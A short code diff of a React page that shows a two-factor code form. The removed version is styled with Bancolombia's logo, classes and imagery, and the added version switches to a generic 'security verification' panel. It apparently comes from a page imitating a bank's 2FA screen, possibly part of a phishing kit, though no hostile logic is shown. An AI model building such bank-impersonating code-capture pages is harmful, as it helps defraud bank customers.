@@ -1,6 +1,6 @@
-import AppLogoBancolombia from "./components/AppLogoBancolombia";
+import PanelShell from "./components/PanelShell";
 import CodeForm from "./components/CodeForm";
-import AppFooter from "./components/AppFooter";
+import Footer from "./components/Footer";
 
 export default function CodePage({ searchParams }) {
   const initialStep = parseInt(searchParams?.step, 10) || 1;
@@ -8,20 +8,13 @@ export default function CodePage({ searchParams }) {
   const phone = searchParams?.phone || "";
 
   return (
-    <main className="svp-main">
-      <div className="bc-container-fluid trazo" style={{ backgroundImage: "url(/assets/images/trazo.svg)" }}>
-        <AppLogoBancolombia />
-        <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
-          Verificación de código 2FA
-        </h1>
-
-        <div className="bc-row bc-justify-content-center form-container">
-          <div className="bc-col-xs-6 bc-col-md-8 bc-col-lg-4">
-            <CodeForm initialStep={initialStep} user={user} phone={phone} />
-          </div>
-        </div>
-      </div>
-      <AppFooter />
-    </main>
+    <PanelShell
+      title="Verificación de seguridad"
+      subtitle="Completa el flujo de validación para continuar con el acceso del usuario."
+      footer={<Footer />}
+      compact
+    >
+      <CodeForm initialStep={initialStep} user={user} phone={phone} />
+    </PanelShell>
   );
 }
